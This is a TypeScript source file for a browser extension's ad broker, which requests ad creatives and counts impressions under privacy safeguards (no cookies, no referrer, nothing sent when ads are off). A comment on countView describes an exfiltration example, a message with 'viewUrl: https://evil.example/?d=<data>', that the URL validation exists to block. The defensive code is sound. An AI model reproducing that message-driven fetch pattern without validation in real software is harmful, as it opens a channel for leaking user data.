/**
 * The ad broker. The only code in the extension that fetches an advertisement.
 *
 * It lives in the service worker beside the deep-analysis broker, and for the
 * same reason: the worker is the extension's single network boundary, so one
 * file still holds every outbound request. Putting this fetch in the popup
 * would create a second boundary inside a page that renders a grade, and the
 * audit note in the README — "the shipped content, popup and options bundles
 * contain no network call" — would stop being true.
 *
 * Three rules this file exists to keep:
 *   1. The request is built by policy.ts, which has no access to page data.
 *   2. Ads switched off means no request is made, not a response discarded.
 *   3. Any failure yields a null creative. The slot is decoration; the grade
 *      is the product, and a dead ad server must never degrade it.
 */

import { getSettings } from '../shared/settings.js';
import { activeNetworks, isAllowedCreativeUrl } from '../shared/ads/registry.js';
import { decisionBody, decisionUrl, normaliseCreative } from '../shared/ads/providers.js';
import type { AdCreative, AdSlot } from '../shared/ads/types.js';

/**
 * Shorter than the deep-analysis timeout. Deep analysis is something a person
 * asked for and will wait for; an ad is something nobody asked for, so it gets
 * one quick chance and is then abandoned.
 */
const AD_TIMEOUT_MS = 6_000;

/** Ask the first configured network for a creative. Never throws. */
export async function requestAd(slot: AdSlot): Promise<AdCreative | null> {
  const settings = await getSettings();
  // Checked before anything touches the network. A request made and then
  // discarded has still told the network that this install exists.
  if (!settings.adsEnabled) return null;

  const [network] = activeNetworks();
  if (!network) return null;

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), AD_TIMEOUT_MS);

  try {
    const response = await fetch(decisionUrl(network), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: decisionBody(slot),
      signal: controller.signal,
      // No ambient authority: a network that could read cookies could correlate
      // this request with any other session it can see, which is exactly the
      // cross-site tracking this extension's privacy policy rules out.
      credentials: 'omit',
      cache: 'no-store',
      referrerPolicy: 'no-referrer',
    });

    if (!response.ok) return null;
    return normaliseCreative(network.id, await response.json());
  } catch {
    // Offline, aborted, blocked by the user's own filter list, or malformed
    // JSON. All of them mean the same thing here: show no ad, say nothing.
    return null;
  } finally {
    clearTimeout(timeout);
  }
}

/**
 * Count an impression, if the network asked for one.
 *
 * The view URL is an opaque token the network minted for this creative. It
 * carries no page data because we never sent any for it to be derived from.
 *
 * Unlike everything else the worker fetches, this URL arrives by message, so
 * any code that can post a runtime message can propose a destination. Without
 * the checks below that is an exfiltration primitive — `winnow:ad-view` with
 * `viewUrl: https://evil.example/?d=<data>` would turn the worker into a
 * courier for whatever the sender wanted to send.
 *
 * So it is validated here rather than at the call site. Today's only caller
 * passes a URL that normaliseCreative already approved, which is exactly the
 * reasoning that makes this kind of hole survive: the guarantee lives in a
 * different file from the fetch, and the next caller will not know that.
 * This is the same hazard isDevEndpoint closes for the developer endpoint.
 */
export async function countView(viewUrl: string): Promise<void> {
  if (!isAllowedCreativeUrl(viewUrl)) return;

  // Someone who switched sponsorship off has asked not to be counted; a stale
  // message queued before the change must not count them anyway.
  if (!(await getSettings()).adsEnabled) return;

  try {
    await fetch(viewUrl, {
      method: 'GET',
      credentials: 'omit',
      cache: 'no-store',
      referrerPolicy: 'no-referrer',
    });
  } catch {
    // An uncounted impression costs a fraction of a cent. It is not worth a
    // retry, a log, or any behaviour the user could notice.
  }
}
